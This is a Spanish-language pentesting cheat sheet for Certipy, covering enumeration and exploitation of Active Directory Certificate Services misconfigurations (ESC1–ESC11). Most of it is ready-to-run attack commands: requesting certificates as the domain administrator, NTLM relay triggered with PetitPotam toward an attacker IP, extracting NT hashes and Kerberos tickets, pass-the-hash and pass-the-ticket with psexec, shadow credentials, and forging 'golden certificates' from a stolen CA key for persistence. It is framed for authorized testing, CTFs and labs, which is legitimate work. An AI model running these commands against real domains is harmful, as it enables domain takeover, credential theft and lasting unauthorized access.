# Certipy — Active Directory Certificate Services (ADCS) Exploitation

Herramienta para enumerar y explotar misconfiguraciones en AD Certificate Services. Permite escalar privilegios a Domain Admin a través de certificados.

**Contexto:** Uso en pentesting autorizado de AD, CTFs, y laboratorios de seguridad.

---

## Instalación
```bash
pip install certipy-ad
# O desde source
git clone https://github.com/ly4k/Certipy.git
cd Certipy && pip install .
```

---

## Enumeración

### Encontrar CAs y Templates Vulnerables
```bash
# Enumeración completa (genera output y BloodHound-compatible JSON)
certipy find -u 'user@target.local' -p 'password' -dc-ip <DC_IP>

# Con hash NTLM
certipy find -u 'user@target.local' -hashes ':<NTLM>' -dc-ip <DC_IP>

# Solo vulnerabilidades (más rápido)
certipy find -u 'user@target.local' -p 'password' -dc-ip <DC_IP> -vulnerable

# Output específico
certipy find -u 'user@target.local' -p 'password' -dc-ip <DC_IP> -output certipy_results

# Generar JSON para BloodHound
certipy find -u 'user@target.local' -p 'password' -dc-ip <DC_IP> -old-bloodhound
```

**Output:** Genera archivos `*_Certipy.txt` (texto) y `*_Certipy.json` (BloodHound).

---

## Escalation Scenarios (ESC1-ESC11)

### ESC1 — Misconfigured Certificate Template
**Condición:** Template permite al enrollee especificar un Subject Alternative Name (SAN) arbitrario + el usuario tiene enrollment rights.

```bash
# Solicitar certificado como Domain Admin
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'VulnerableTemplate' \
  -upn 'administrator@target.local'

# Autenticarse con el certificado
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# Output: NT hash del administrator
```

### ESC2 — Any Purpose or Subordinate CA Template
**Condición:** Template con EKU "Any Purpose" o sin EKU + enrollment rights.

```bash
# Similar a ESC1
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'SubCA'
```

### ESC3 — Enrollment Agent Template
**Condición:** Template con "Certificate Request Agent" EKU + puede enrollar en nombre de otros.

```bash
# Paso 1: Obtener enrollment agent certificate
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'EnrollmentAgent'

# Paso 2: Usar para enrollar como otro usuario
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'User' \
  -on-behalf-of 'target\administrator' \
  -pfx enrollment_agent.pfx
```

### ESC4 — Vulnerable Template ACL
**Condición:** El usuario tiene write access sobre el template → puede modificarlo para hacerlo vulnerable a ESC1.

```bash
# Modificar template para habilitar SAN
certipy template -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -template 'VulnerableTemplate' -save-old

# Ahora explotar como ESC1
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'VulnerableTemplate' \
  -upn 'administrator@target.local'

# Restaurar template original
certipy template -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -template 'VulnerableTemplate' -configuration VulnerableTemplate.json
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag en CA
**Condición:** La CA tiene la flag EDITF_ATTRIBUTESUBJECTALTNAME2 habilitada → cualquier template puede especificar SAN.

```bash
# Solicitar certificado con SAN en cualquier template
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'User' \
  -upn 'administrator@target.local'
```

### ESC7 — Vulnerable CA ACL
**Condición:** El usuario tiene ManageCA o ManageCertificates rights sobre la CA.

```bash
# Con ManageCA: habilitar SubCA template
certipy ca -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -enable-template 'SubCA'

# Solicitar certificado SubCA (será denied pero guardado)
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -template 'SubCA' \
  -upn 'administrator@target.local'
# Nota: Request ID del output

# Issue el certificado pendiente (requiere ManageCertificates)
certipy ca -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -issue-request <REQUEST_ID>

# Retrieve el certificado
certipy req -u 'user@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -retrieve <REQUEST_ID>
```

### ESC8 — NTLM Relay to ADCS HTTP Enrollment
**Condición:** Web enrollment de ADCS habilitado + se puede hacer NTLM relay.

```bash
# Iniciar relay hacia el endpoint de enrollment
certipy relay -target 'http://ca-server/certsrv/certfnsh.asp' -ca 'target-CA'

# Trigger NTLM auth (con PetitPotam, PrinterBug, etc.)
# El relay solicita un certificado como la máquina/usuario que autentica
python3 PetitPotam.py <attacker_IP> <DC_IP>
```

### ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
```bash
# Si GenericWrite sobre otro usuario:
certipy shadow auto -u 'user@target.local' -p 'password' \
  -account 'targetuser' -dc-ip <DC_IP>
```

### ESC11 — NTLM Relay to ADCS via RPC
```bash
# Similar a ESC8 pero via RPC en lugar de HTTP
certipy relay -target 'rpc://ca-server' -ca 'target-CA'
```

---

## Autenticación con Certificados

### Obtener NT Hash / TGT
```bash
# Autenticar con PFX y obtener NT hash
certipy auth -pfx user.pfx -dc-ip <DC_IP>

# Autenticar y obtener TGT (ccache)
certipy auth -pfx user.pfx -dc-ip <DC_IP>
# Genera .ccache file → export KRB5CCNAME=file.ccache

# Especificar dominio si es necesario
certipy auth -pfx user.pfx -dc-ip <DC_IP> -domain target.local

# Con LDAP shell
certipy auth -pfx user.pfx -dc-ip <DC_IP> -ldap-shell
```

### Usar Hash/TGT Obtenido
```bash
# Pass-the-Hash con el NT hash obtenido
crackmapexec smb <target> -u administrator -H '<NT_hash>'
psexec.py target.local/administrator@<target> -hashes ':<NT_hash>'

# Pass-the-Ticket con el TGT
export KRB5CCNAME=administrator.ccache
psexec.py target.local/administrator@dc01.target.local -k -no-pass
```

---

## Shadow Credentials

```bash
# Agregar shadow credentials a un usuario (requiere GenericWrite)
certipy shadow auto -u 'user@target.local' -p 'password' \
  -account 'targetuser' -dc-ip <DC_IP>

# Lista shadow credentials de un usuario
certipy shadow list -u 'user@target.local' -p 'password' \
  -account 'targetuser' -dc-ip <DC_IP>

# Limpiar shadow credentials
certipy shadow clear -u 'user@target.local' -p 'password' \
  -account 'targetuser' -dc-ip <DC_IP>
```

---

## Account Persistence (Golden Certificate)

```bash
# Backup CA private key (requiere DA)
certipy ca -u 'administrator@target.local' -p 'password' -dc-ip <DC_IP> \
  -ca 'target-CA' -backup

# Forge certificado como cualquier usuario
certipy forge -ca-pfx ca.pfx -upn 'administrator@target.local' \
  -subject 'CN=Administrator,CN=Users,DC=target,DC=local'

# Autenticar con certificado forjado
certipy auth -pfx forged.pfx -dc-ip <DC_IP>
```

---

## Workflow Típico

```
1. ENUMERATE:  certipy find -vulnerable
2. IDENTIFY:   Revisar output para ESC1-ESC11
3. EXPLOIT:    certipy req con template vulnerable
4. AUTH:       certipy auth con PFX obtenido
5. ESCALATE:   Usar NT hash / TGT para acceso
6. PERSIST:    Golden Certificate si es necesario (autorizado)
7. CLEANUP:    Restaurar templates modificados
```

---

## Tips

- **ESC1 es el más común** — siempre buscar templates con "Enrollee Supplies Subject" habilitado
- **certipy find -vulnerable** es tu mejor amigo — corre esto primero siempre
- **BloodHound integration** — importar los JSON de certipy en BloodHound para ver rutas visuales
- **ESC8 requiere trigger** — combinar con PetitPotam, PrinterBug, o DFSCoerce para NTLM relay
- **Clock skew** — si falla auth con certificado, sincronizar reloj: `ntpdate <DC_IP>`
- **PKINIT no soportado** — si el DC no soporta PKINIT, usar `-ldap-shell` en vez de auth normal
- **Cleanup es crítico** — en engagements reales, siempre restaurar templates y limpiar shadow credentials
